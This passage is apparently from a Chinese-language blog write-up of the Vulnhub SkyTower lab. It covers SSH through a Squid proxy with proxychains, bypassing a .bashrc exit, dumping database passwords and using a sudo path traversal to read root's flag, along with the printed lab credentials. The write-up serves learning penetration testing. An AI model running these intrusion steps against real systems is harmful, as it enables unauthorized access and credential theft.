+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**Unfortunately, all international contracts, including yours have been terminated.**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The remainder of your contract and retirement fund, **$2** ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**Username: john**  
+</span></span><span class=line><span class=cl>**Password: hereisjohn**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>We wish you the best of luck in your future endeavors.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>**欢迎联系 john@skytech.com  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**如您所知，SkyTech 已经停止了所有国际业务活动。  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>致我们所有长期工作的员工，感谢你们的奉献精神和辛勤工作。  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**不幸的是，包括您的合同在内的所有国际合同都已经终止了。**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>您剩余合同期限内的款项以及退休基金$2 已经全额转入一个安全的账户中。出于安全考虑，您必须通过 SSH 登录到 SkyTech 服务器，才能访问账户信息。  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>**用户名：john**  
+</span></span><span class=line><span class=cl>**密码：hereisjohn**  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>祝你在未来的事业中取得圆满成功
+</span></span></code></pre></td></tr></table></div></div><p>到目前为止，不需要扫描目录，根据提示现在ssh登陆试试</p><h2 id=注入成功获得提示需要利用22端口ssh登陆>注入成功获得提示，需要利用22端口ssh登陆</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/SkyTower<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ssh john@10.10.10.132                         
+</span></span></code></pre></td></tr></table></div></div><p>无响应，根据之前nmap的端口扫描显示22端口过滤，是正常的</p><p>先对3128端口进行了解，以下源于百度</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>3128 端口是‌**Squid HTTP 代理服务器的默认监听端口**‌，主要用于‌**客户端请求转发、缓存加速及流量过滤**‌。‌‌
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>-</span> ‌**核心用途**‌：作为 Squid 代理服务的标准通信接口，承担 HTTP/HTTPS 请求的中转、缓存存储及访问控制执行 。
+</span></span><span class=line><span class=cl><span class=k>-</span> ‌**典型场景**‌：企业内网代理、网页缓存加速、隐藏客户端真实 IP、批量数据采集及网络访问审计 。
+</span></span><span class=line><span class=cl><span class=k>-</span> ‌**技术特性**‌：相比 8080 端口，3128 被定义为代理专用标准端口，防火墙拦截率较低，稳定性与并发承载能力更强 。
+</span></span><span class=line><span class=cl><span class=k>-</span> ‌**安全注意**‌：因特征明显，常被扫描工具用于探测开放代理资源；若未配置访问控制列表（ACL），可能导致非法匿名访问风险 。‌‌
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>该端口号可在 Squid 配置文件（<span class=sb>`squid.conf`</span>）中通过 <span class=sb>`http_port`</span> 指令自定义修改，并非强制固定 。‌‌
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>攻击者利用方式
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>1.</span> ‌**未授权代理滥用**‌：若 Squid 配置为<span class=sb>`http_access allow all`</span>且无认证，攻击者可将其作为‌**开放代理**‌，匿名发起攻击、爬取数据或绕过 IP 封禁，导致源服务器日志仅记录代理 IP 而非攻击者真实身份 。
+</span></span><span class=line><span class=cl><span class=k>2.</span> ‌**内网横向移动**‌：利用该代理作为‌**跳板**‌，扫描和访问原本无法直接触及的内网资源（如数据库、管理后台），实现“漫游内网”。
+</span></span><span class=line><span class=cl><span class=k>3.</span> ‌**弱口令接管**‌：若开启管理接口或存在默认弱口令（如 admin/admin），攻击者可登录后台修改配置、上传 WebShell 或执行系统命令 。
+</span></span><span class=line><span class=cl><span class=k>4.</span> ‌**漏洞利用**‌：针对特定 Squid 版本的历史漏洞（如远程代码执行、信息泄露）进行攻击，获取服务器控制权
+</span></span></code></pre></td></tr></table></div></div><h2 id=利用3128端口当跳板尝试ssh登陆>利用3128端口当跳板，尝试ssh登陆</h2><p>以上操作需要对kali和Linux操作熟悉</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>printf</span> <span class=s2>&#34;strict_chain\nproxy_dns\n[ProxyList]\nhttp 10.10.10.132 3128\n&#34;</span> &gt; /tmp/sky_proxy.conf
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>proxychains4 -f /tmp/sky_proxy.conf ssh john@10.10.10.132 -t <span class=s2>&#34;/bin/sh&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>再输入一个密码</p><p>获得shell</p><h3 id=第一次打这个靶场在这里遇到的问题>第一次打这个靶场，在这里遇到的问题</h3><p>之前是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains ssh john@192.168.108.132
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>john@192.168.108.132<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Linux SkyTower 3.2.0-4-amd64 <span class=c1>#1 SMP Debian 3.2.54-2 x86_64</span>
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>Funds have been withdrawn
+</span></span><span class=line><span class=cl>Connection to 192.168.108.132 closed.
+</span></span></code></pre></td></tr></table></div></div><p>登录成功但立即退出，提示 <code>Funds have been withdrawn</code>。这表明登录脚本（如 <code>.bashrc</code> 或 <code>.profile</code>）中包含自动退出的指令。</p><p>尝试直接执行命令获取信息（成功执行但无交互）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains ssh john@192.168.108.132 <span class=s2>&#34;grep ^john /etc/passwd&#34;</span>
+</span></span><span class=line><span class=cl>john:x:1000:1000:john,,,:/home/john:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p><code>-t</code> 强制分配伪终端，<code>"/bin/sh"</code> 指定启动 <code>/bin/sh</code>（而不是默认的 bash）。</p><p>加了这两个参数后：SSH 登录后会直接执行 <code>/bin/sh</code>，而不会 去执行 <code>.bashrc</code> 文件里的 <code>exit</code> 命令。这样你就能稳稳地留在这个 Shell 里，不被踢出去。</p><p>可以进行验证</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>cat ~/.bashrc
+</span></span></code></pre></td></tr></table></div></div><p>接着最下方的exit是罪魁祸首</p><h2 id=先尝试提权失败>先尝试提权&ndash;失败</h2><h3 id=先尝试sudo提权>先尝试sudo提权</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the <span class=nb>local</span> System
+</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
+</span></span><span class=line><span class=cl><span class=c1>#1) Respect the privacy of others.</span>
+</span></span><span class=line><span class=cl><span class=c1>#2)Think before you type.</span>
+</span></span><span class=line><span class=cl><span class=c1>#3) with great power comes great responsibility.</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> john:
+</span></span><span class=line><span class=cl>Sorry, user john may not run sudo on SkyTower.
+</span></span></code></pre></td></tr></table></div></div><p>失败</p><h3 id=再尝试suid提权>再尝试suid提权</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/bin/sudoedit
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/usr/lib/pt_chown
+</span></span><span class=line><span class=cl>/bin/su
+</span></span><span class=line><span class=cl>/bin/ping
+</span></span><span class=line><span class=cl>/bin/ping6
+</span></span><span class=line><span class=cl>/bin/umount
+</span></span><span class=line><span class=cl>/bin/mount
+</span></span></code></pre></td></tr></table></div></div><p>没有特殊的文件</p><h2 id=重新信息收集查看网站源码>重新信息收集查看网站源码</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>cd</span> /var/www
+</span></span><span class=line><span class=cl>$ ls
+</span></span><span class=line><span class=cl>background2.jpg  background.jpg  index.html  login.php
+</span></span><span class=line><span class=cl>$ cat login.php
+</span></span></code></pre></td></tr></table></div></div><p>随后发现里面隐藏敏感信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;SkyTech&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>数据库主机：<code>localhost</code></li><li>用户名：<code>root</code></li><li>密码：<code>root</code></li><li>数据库名：<code>SkyTech</code></li></ul><h2 id=进行数据枚举获取其他用户信息>进行数据枚举获取其他用户信息</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ mysql -uroot -proot
+</span></span><span class=line><span class=cl>Welcome to the MySQL monitor...
+</span></span><span class=line><span class=cl>mysql&gt; show databases<span class=p>;</span>
+</span></span><span class=line><span class=cl>+--------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
+</span></span><span class=line><span class=cl>+--------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> SkyTech            <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> mysql              <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> performance_schema <span class=p>|</span>
+</span></span><span class=line><span class=cl>+--------------------+
+</span></span><span class=line><span class=cl>mysql&gt; use SkyTech<span class=p>;</span>
+</span></span><span class=line><span class=cl>mysql&gt; show tables<span class=p>;</span>
+</span></span><span class=line><span class=cl>+-------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_SkyTech <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> login             <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-------------------+
+</span></span><span class=line><span class=cl>mysql&gt; <span class=k>select</span> * from login<span class=p>;</span>
+</span></span><span class=line><span class=cl>+----+---------------------+--------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> id <span class=p>|</span> email               <span class=p>|</span> password     <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----+---------------------+--------------+
+</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>1</span> <span class=p>|</span> john@skytech.com    <span class=p>|</span> hereisjohn   <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>2</span> <span class=p>|</span> sara@skytech.com    <span class=p>|</span> ihatethisjob <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>3</span> <span class=p>|</span> william@skytech.com <span class=p>|</span> senseable    <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----+---------------------+--------------+
+</span></span><span class=line><span class=cl><span class=m>3</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><strong>新发现的两个系统用户及密码</strong>：</p><ul><li><code>sara</code>：<code>ihatethisjob</code></li><li><code>william</code>：<code>senseable</code></li></ul><h2 id=横向移动到-sara-用户>横向移动到 sara 用户</h2><p>使用代理 SSH 以 sara 身份登录，或者在这个终端使用sudo sara 在这里使用方法二</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ su sara -s /bin/sh
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>$ whoami
+</span></span><span class=line><span class=cl>sara
+</span></span></code></pre></td></tr></table></div></div><p>密码是ihatethisjob</p><h2 id=再次进行sudo提权>再次进行sudo提权</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> sara on this host:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User sara may run the following commands on this host:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /bin/cat /accounts/*, <span class=o>(</span>root<span class=o>)</span> /bin/ls /accounts/*
+</span></span></code></pre></td></tr></table></div></div><p>用户sara可以不需要密码执行cat 和ls 命令</p><h2 id=获取root目录下的flag>获取root目录下的flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo ls /accounts/../
+</span></span><span class=line><span class=cl>accounts  bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
+</span></span><span class=line><span class=cl>$ sudo ls /accounts/../root
+</span></span><span class=line><span class=cl>flag.txt
+</span></span><span class=line><span class=cl>$ sudo cat /accounts/../root/flag.txt
+</span></span><span class=line><span class=cl>Congratz, have a cold one to celebrate!
+</span></span><span class=line><span class=cl>root password is theskytower
+</span></span></code></pre></td></tr></table></div></div><h2 id=总结>总结</h2><h3 id=攻击路径回顾>攻击路径回顾</h3><ol><li><strong>信息收集</strong>：发现 80 端口 Web 服务和 3128 端口 Squid 代理。</li><li><strong>SQL 注入</strong>：利用登录页面的注入漏洞获取 john 用户的 SSH 密码。</li><li><strong>代理绕过</strong>：通过 Squid 代理配置 <code>proxychains</code>，绕过防火墙对 22 端口的限制。</li><li><strong>绕过登录脚本</strong>：使用 <code>-t "/bin/sh"</code> 获得 john 的交互式 Shell。</li><li><strong>数据库枚举</strong>：从 Web 源码中获取数据库凭证，查询到 sara 和 william 的密码。</li><li><strong>横向移动</strong>：切换到 sara 用户，发现其 sudo 权限。</li><li><strong>权限提升</strong>：利用 sara 的 sudo 路径遍历漏洞读取 root 目录，获取 root 密码。</li><li><strong>最终提权</strong>：切换至 root 用户，完成渗透。</li></ol><h3 id=关于-ssh-退出的说明>关于 SSH 退出的说明</h3><p>经检查，<code>/home/john/.bashrc</code> 中包含导致自动退出的命令。使用 <code>-t "/bin/sh"</code> 启动 shell 可避免加载用户配置文件，从而绕过此限制。生产环境中，应避免在登录脚本中执行可能中断会话的操作。</p><h3 id=本靶场涉及知识点>本靶场涉及知识点</h3><p>✔ Nmap信息收集</p><p>✔ SQL注入</p><p>✔ Burp Suite</p><p>✔ Squid代理</p><p>✔ Proxychains</p><p>✔ SSH</p><p>✔ 数据库枚举</p><p>✔ Linux横向移动</p><p>✔ sudo配置错误</p><p>✔ 路径遍历</p></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
